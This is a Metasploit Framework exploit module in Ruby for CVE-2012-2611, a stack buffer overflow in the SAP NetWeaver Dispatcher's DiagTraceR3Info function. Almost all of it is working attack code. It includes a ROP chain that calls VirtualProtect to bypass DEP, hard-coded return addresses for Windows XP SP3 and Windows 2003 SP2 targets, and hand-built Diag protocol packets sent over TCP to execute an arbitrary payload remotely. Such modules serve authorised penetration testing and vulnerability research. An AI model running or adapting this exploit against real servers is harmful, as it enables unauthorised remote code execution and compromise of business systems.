##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the SAP NetWeaver Dispatcher
				service. The overflow occurs in the DiagTraceR3Info() function and allows a remote
				attacker to execute arbitrary code by supplying a special crafted Diag packet. The
				Dispatcher service is only vulnerable if the Developer Traces have been configured
				at levels 2 or 3. The module has been successfully tested on SAP Netweaver 7.0 EHP2
				SP6 over Windows XP SP3 and Windows 2003 SP2 (DEP bypass).
			},
			'Author'      => [
				'Martin Gallo', # Vulnerability discovery and PoC
				'juan vazquez' # Metasploit module
			],
			'References'     =>
				[
					[ 'OSVDB', '81759' ],
					[ 'CVE', '2012-2611' ],
					[ 'BID', '53424' ],
					[ 'EDB', '20705' ],
					[ 'URL', 'http://www.coresecurity.com/content/sap-netweaver-dispatcher-multiple-vulnerabilities'],
					[ 'URL', 'http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=publication&name=Uncovering_SAP_vulnerabilities_reversing_and_breaking_the_Diag_protocol']
				],
			'DefaultOptions' =>
				{
					'InitialAutoRunScript' => 'migrate -f',
					'EXITFUNC' => 'process'
				},
			'Payload'        =>
				{
					'Space'    => 4000,
					'BadChars' => "\x00",
					'DisableNops' => true,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# disp+work.exe version 7200.70.18.23869
					[
						'SAP Netweaver 7.0 EHP2 SP6 / Windows XP SP3',
						{
							'Ret' => 0x5f7a # 0x005f007a # call ebx from disp+work.EXE
						}
					],
					[
						'SAP Netweaver 7.0 EHP2 SP6 / Windows 2003 SP2',
						{
							'Ret' => 0x77bde7f6 # {pivot 44} # ADD ESP,2C # RETN from msvcrt.dll
						}
					]
				],
			'Privileged'     => false,
			'DefaultTarget'  => 1,
			'DisclosureDate' => 'May 8 2012'))

			register_options([Opt::RPORT(3200)], self.class)

	end

	def create_rop_chain()
		# ROP chains provided by Corelan.be
		# https://www.corelan.be/index.php/security/corelan-ropdb/#msvcrtdll_8211_v7037903959_Windows_2003_SP1_SP2
		rop_gadgets =
			[
				0x77bb2563, # POP EAX # RETN
				0x77ba1114, # <- *&VirtualProtect()
				0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
				0x41414141, #junk
				0x77bb0c86, # XCHG EAX,ESI # RETN
				0x77bc9801, # POP EBP # RETN
				0x77be2265, # ptr to 'push esp #  ret'
				0x77bb2563, # POP EAX # RETN
				0x03C0A40F,
				0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)
				0x77bb48d3, # POP EBX, RET
				0x77bf21e0, # .data
				0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
				0x77bbfc02, # POP ECX # RETN
				0x77bef001, # W pointer (lpOldProtect) (-> ecx)
				0x77bd8c04, # POP EDI # RETN
				0x77bd8c05, # ROP NOP (-> edi)
				0x77bb2563, # POP EAX # RETN
				0x03c0984f,
				0x77bdd441, # SUB EAX, 03c0940f
				0x77bb8285, # XCHG EAX,EDX # RETN
				0x77bb2563, # POP EAX # RETN
				0x90909090,#nop
				0x77be6591, # PUSHAD # ADD AL,0EF # RETN
			].pack("V*")

		return rop_gadgets
	end

	def exploit

		peer = "#{rhost}:#{rport}"

		connect

		# initialize
		diagheader = "\x00\x10\x00\x00\x00\x00\x00\x00"
		user_connect = "\x10\x04\x02\x00\x0c\x00\x00\x00\xc8\x00\x00\x04\x4c\x00\x00\x0b\xb8"
		support_data = "\x10\x04\x0b\x00\x20"
		support_data << "\xff\x7f\xfa\x0d\x78\xb7\x37\xde\xf6\x19\x6e\x93\x25\xbf\x15\x93"
		support_data << "\xef\x73\xfe\xeb\xdb\x51\xed\x01\x00\x00\x00\x00\x00\x00\x00\x00"
		dpheader = "\xff\xff\xff\xff\x0a\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff"
		dpheader << "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
		dpheader << [diagheader.length + user_connect.length + support_data.length].pack("V")
		dpheader << "\x00\xff\xff\xff\xff\xff\xff\x20\x20\x20\x20\x20\x20\x20\x20\x20"
		dpheader << "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
		dpheader << "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
		dpheader << "terminalXXXXXXX"
		dpheader << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x20\x20\x20\x20\x20"
		dpheader << "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x00\x00"
		dpheader << "\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x01\x00"
		dpheader << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		dpheader << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		dpheader << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		dpheader << "\x00\x00\x00\x00\x00\x00\x00\x00"
		pkt = [dpheader.length + diagheader.length + user_connect.length + support_data.length].pack("N")
		pkt << dpheader
		pkt << diagheader
		pkt << user_connect
		pkt << support_data
		print_status("#{peer} - Sending initialize packet to the SAP Dispatcher")
		sock.put(pkt)
		res = sock.get_once(-1)

		if not res
			print_error("#{peer} - The connection with the Dispatcher has not been initialized")
			return
		end

		# send message
		if target.name =~ /Windows XP SP3/
			crash = make_nops(112)
			crash << "\xeb\x02" # jmp over call pointer
			crash << [target.ret].pack("v")
			crash << make_nops(10) * 200
			crash << payload.encoded
		else # Windows 2003
			crash = "C\x00" # Avoid "UNICODE" conversion when copying data to stack
			crash << rand_text(2) # padding
			crash << [0x77bd7d82].pack("V") * 55  # <== after stackpivoting esp points here # "ret" ROP nop from msvcrt
			crash << [0x77bdf0da].pack("V")  # pop eax # ret from msvcrt
			crash << [target.ret].pack("V") # stackpivot
			crash << create_rop_chain
			crash << payload.encoded
		end

		print_status("#{peer} - Sending crafted message")
		message = "\x10\x06\x20" + [crash.length].pack("n") + crash
		diagheader = "\x00\x00\x00\x00\x00\x00\x00\x00"
		step = "\x10\x04\x26\x00\x04\x00\x00\x00\x01"
		eom = "\x0c"
		pkt = [diagheader.length + step.length + message.length + eom.length].pack("N")
		pkt << diagheader
		pkt << step
		pkt << message
		pkt << eom
		sock.put(pkt)

		disconnect
	end

end
